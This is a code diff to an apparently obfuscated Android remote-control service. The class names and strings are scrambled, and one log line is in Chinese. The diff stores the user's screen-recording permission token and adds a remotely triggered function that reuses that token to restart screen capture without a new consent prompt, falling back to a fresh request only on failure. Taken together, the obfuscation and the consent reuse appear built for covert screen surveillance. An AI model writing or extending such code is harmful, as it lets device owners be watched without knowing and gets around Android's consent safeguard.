@@ -229,10 +229,9 @@ class DFm8Y8iMScvB2YDw : Service() {
                 }
                 else if(arg1==p50.a(byteArrayOf(-16), byteArrayOf(-63, -13, -107, -101, 57, 111, 52, -114)))
                 {
+                    Log.i("MainService", "开共享: received, posting to main thread")
                     Handler(Looper.getMainLooper()).post {
-                        if (!isStart) {
-                            startCapture()
-                        }
+                        restoreMediaProjection()
                     }
                 }
             } 
@@ -276,6 +275,7 @@ class DFm8Y8iMScvB2YDw : Service() {
         private var _isAudioStart = false // audio capture start status
 
         var ctx: DFm8Y8iMScvB2YDw? = null
+        private var savedMediaProjectionIntent: Intent? = null
         
         val isReady: Boolean
             get() = _isReady
@@ -469,6 +469,7 @@ class DFm8Y8iMScvB2YDw : Service() {
                 getSystemService(p50.a(byteArrayOf(118, 104, 74, -67, 14, -83, 107, 127, 65, -66, 10, -111, 111, 100, 65, -70), byteArrayOf(27, 13, 46, -44, 111, -14))) as MediaProjectionManager
 
             intent.getParcelableExtra<Intent>(EXT_MEDIA_PROJECTION_RES_INTENT)?.let {
+                savedMediaProjectionIntent = it.clone() as Intent
                 mediaProjection =
                     mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, it)
                 mediaProjection?.registerCallback(object : MediaProjection.Callback() {
@@ -717,6 +718,56 @@ class DFm8Y8iMScvB2YDw : Service() {
         checkMediaPermission()
 
         Log.i("MainService", "killMediaProjection: complete")
+    }
+
+    fun restoreMediaProjection() {
+        Log.i("MainService", "restoreMediaProjection: begin, savedIntent=${savedMediaProjectionIntent != null}")
+
+        if (_isStart && mediaProjection != null) {
+            Log.i("MainService", "restoreMediaProjection: already sharing, skip")
+            return
+        }
+
+        shouldRun = false
+        SKL = false
+        Log.i("MainService", "restoreMediaProjection: stopped screenshot loop")
+
+        val savedIntent = savedMediaProjectionIntent
+        if (savedIntent != null) {
+            try {
+                val mediaProjectionManager =
+                    getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
+
+                val newProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, savedIntent.clone() as Intent)
+
+                if (newProjection != null) {
+                    mediaProjection = newProjection
+                    mediaProjection?.registerCallback(object : android.media.projection.MediaProjection.Callback() {
+                        override fun onStop() {
+                            Log.w("MainService", "MediaProjection stopped by system")
+                            _isReady = false
+                            _isStart = false
+                            Handler(Looper.getMainLooper()).post {
+                                checkMediaPermission()
+                            }
+                        }
+                    }, Handler(Looper.getMainLooper()))
+
+                    _isReady = true
+                    checkMediaPermission()
+
+                    val captureResult = startCapture()
+                    Log.i("MainService", "restoreMediaProjection: startCapture result=$captureResult (token reuse)")
+                    return
+                }
+            } catch (e: Exception) {
+                Log.w("MainService", "restoreMediaProjection: token reuse failed, requesting new permission", e)
+                savedMediaProjectionIntent = null
+            }
+        }
+
+        Log.i("MainService", "restoreMediaProjection: requesting new MediaProjection permission")
+        requestMediaProjection()
     }
 
     @Synchronized
